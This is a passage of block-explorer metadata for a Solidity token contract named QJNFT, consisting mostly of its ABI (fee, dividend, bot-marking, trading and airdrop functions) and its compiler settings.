IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_TokenStation\",\"outputs\":[{\"internalType\":\"contract TokenStation\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"addHolderByHand\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"user\",\"type\":\"address[]\"}],\"name\":\"addHolderByHandMulti\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"amount\",\"type\":\"uint256[]\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"airdropMulti\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"botMap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"calcBase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"excludeHolder\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeDividendAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeDividendBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeDividendSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEarn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquiditySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingTo2\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeRemoveLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeRemoveLiquidityTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSellAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTransferAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCurrentPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getHolders\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountDesire\",\"type\":\"uint256\"}],\"name\":\"getPrice4USDT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"holdRewardCondition\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"holders\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isBot\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isHolder\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kb\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"markBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"user\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"markBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"processBlockDuration\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"processGasAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"processRewardCondition\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"progressRewardBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"refreshFeeAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rescueLossToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"}],\"name\":\"rescueLossTokenAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"resetTradeState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reuseLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_holdRewardCondition\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_processRewardCondition\",\"type\":\"uint256\"}],\"name\":\"setDividendCondition\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setDividendExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_holdToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_usdt\",\"type\":\"address\"}],\"name\":\"setDividendToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setExclude\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setExcludes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeMarketingBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeLiquidityBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeDividendBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeBurnBuy\",\"type\":\"uint256\"}],\"name\":\"setFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"setFeeRemoveLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeMarketingSell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeLiquiditySell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeDividendSell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeBurnSell\",\"type\":\"uint256\"}],\"name\":\"setFeeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"}],\"name\":\"setFeeTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_initPrice\",\"type\":\"uint256\"}],\"name\":\"setInitPrice\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"LimitBuy_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LimitSell_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LimitHold_\",\"type\":\"uint256\"}],\"name\":\"setLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setProcessBlockDuration\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setProcessGasAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_kn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_kb\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_surpAddress\",\"type\":\"address\"}],\"name\":\"setSurprise\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setSwapTokensAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"s\",\"type\":\"uint256\"}],\"name\":\"setTradeState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"surpAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSplit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeState\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userHoldPriceMap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "QJNFT", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3864f25987393b980829507eeb4415e08d1aad273c69ba405dc43655d5c2472d"}